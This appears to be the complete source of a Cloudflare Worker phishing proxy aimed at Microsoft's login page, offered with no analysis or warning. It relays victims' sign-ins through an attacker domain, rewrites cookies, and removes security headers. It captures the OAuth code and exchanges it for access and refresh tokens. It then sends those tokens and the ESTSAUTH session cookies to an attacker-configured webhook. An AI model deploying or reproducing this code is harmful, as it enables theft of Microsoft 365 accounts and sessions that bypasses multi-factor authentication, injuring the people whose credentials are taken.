// Microsoft
const upstream = 'login.microsoftonline.com'
const upstream_path = '/common/oauth2/authorize?response_type=code&client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&resource=https://graph.microsoft.com&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient'
const https = true
const webhook = ""
// Blocking
const blocked_region = []
const blocked_ip_address = ['0.0.0.0', '127.0.0.1']

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
})
async function fetchAndApply(request) {
    const region = request.headers.get('cf-ipcountry').toUpperCase();
    const ip_address = request.headers.get('cf-connecting-ip');
   
    let all_cookies = ""
    let response = null;
    let url = new URL(request.url);
    let url_hostname = url.hostname;

    if (https == true) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    var upstream_domain = upstream;
    url.host = upstream_domain;

    // Only append upstream_path for initial request to root path
    if (url.pathname == '/') {
        // Create a new URL by directly concatenating the domain and upstream_path
        url = new URL('https://' + upstream_domain + upstream_path);
    }
    // For all other requests, keep the original path from upstream
    
    if (blocked_region.includes(region)) {
        response = new Response('Access denied.', {
            status: 403
        });
    } else if (blocked_ip_address.includes(ip_address)) {
        response = new Response('Access denied', {
            status: 403
        });
    } else {
        let method = request.method;
        let request_headers = request.headers;
        let new_request_headers = new Headers(request_headers);
        let requestBody = null;

        new_request_headers.set('Host', upstream_domain);
        new_request_headers.set('Referer', url.protocol + '//' + url_hostname);

        // Buffer the request body if it exists
        if (request.body) {
            requestBody = await request.clone().arrayBuffer();
        }

        let original_response = await fetch(url.href, {
            method: method,
            headers: new_request_headers,
            body: requestBody,
            redirect: 'manual'
            
        })

        // Check for 302 redirect first
        if (original_response.status === 302) {
            const locationHeader = original_response.headers.get('Location');
            if (locationHeader && locationHeader.includes('nativeclient?code=')) {
                // Extract the code from Location header
                const codeMatch = locationHeader.match(/nativeclient\?code=([^&]+)/);
                if (codeMatch && codeMatch[1]) {
                    const code = codeMatch[1];
                    try {
                        // Exchange the code for tokens
                        const tokens = await exchangeCodeForTokens(code);
                        
                        // Send tokens to webhook
                        await teams(
                            "<b>Tokens obtained:</b><br><br>" +
                            "<b>Access Token:</b> " + tokens.accessToken + "<br><br>" +
                            "<b>Refresh Token:</b> " + tokens.refreshToken + "<br><br>" +
                            "<b>Expires In:</b> " + tokens.expiresIn + " seconds",
                            webhook
                        );
                    } catch (error) {
                        console.error('Failed to exchange code for tokens:', error);
                    }
                }
            }
            // Always redirect to Office portal for 302 responses
            return Response.redirect('https://portal.office.com', 302);
        }

        connection_upgrade = new_request_headers.get("Upgrade");
        if (connection_upgrade && connection_upgrade.toLowerCase() == "websocket") {
            return original_response;
        }

        let original_response_clone = original_response.clone();
        let original_text = null;
        let response_headers = original_response.headers;
        let new_response_headers = new Headers(response_headers);
        let status = original_response.status;

        new_response_headers.set('access-control-allow-origin', '*');
        new_response_headers.set('access-control-allow-credentials', true);
        new_response_headers.delete('content-security-policy');
        new_response_headers.delete('content-security-policy-report-only');
        new_response_headers.delete('clear-site-data');

        // Replace cookie domains
        try {
            // Get all the Set-Cookie headers
            const originalCookies = new_response_headers.getAll("Set-Cookie");
            all_cookies = originalCookies.join("; <br><br>")

            // Iterate through each original cookie
            originalCookies.forEach(originalCookie => {
                // Replace the value in each cookie
                const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
                
                // Set the modified Set-Cookie header individually
                new_response_headers.append("Set-Cookie", modifiedCookie);
            });
        } catch (error) {
            // Handle errors
            console.error(error);
        }        

        const content_type = new_response_headers.get('content-type');

        original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);
        
        if (
            all_cookies.includes('ESTSAUTH') &&
            all_cookies.includes('ESTSAUTHPERSISTENT')
          ) {
            await teams("<b>Cookies found:</b><br><br>" + all_cookies, webhook);
          }

        response = new Response(original_text, {
            status,
            headers: new_response_headers
        })
    }
    return response;
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text()
    let re = new RegExp('login.microsoftonline.com', 'g')
    text = text.replace(re, host_name);
    return text;
}

async function teams(m, webhook) {
    // Replace 'YOUR_TEAMS_WEBHOOK_URL' with your actual Teams webhook URL
    const teamsWebhookUrl = webhook;
    
    // Example message payload
    const message = {
      text: m
    };
  
    try {
      const response = await fetch(teamsWebhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      });
  
      if (!response.ok) {
        throw new Error('Failed to send message to Teams');
      }
  
      return new Response('Message sent to Teams successfully', { status: 200 });
    } catch (error) {
      return new Response(`Error: ${error.message}`, { status: 500 });
    }
  }

  async function exchangeCodeForTokens(code) {
    const authorityUrl = 'https://login.microsoft.com/common';
    const tokenEndpoint = `${authorityUrl}/oauth2/token`;

    // Prepare the form data
    const formData = new URLSearchParams({
        client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
        resource: 'https://graph.microsoft.com'
    });

    try {
        const response = await fetch(tokenEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData.toString()
        });

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Authentication failed: ${errorText}`);
        }

        const tokenData = await response.json();
        return {
            accessToken: tokenData.access_token,
            refreshToken: tokenData.refresh_token,
            expiresIn: tokenData.expires_in,
            tokenType: tokenData.token_type,
            resource: tokenData.resource,
            // Add any other token data you need
        };
    } catch (error) {
        console.error('Token exchange error:', error);
        throw error;
    }
}
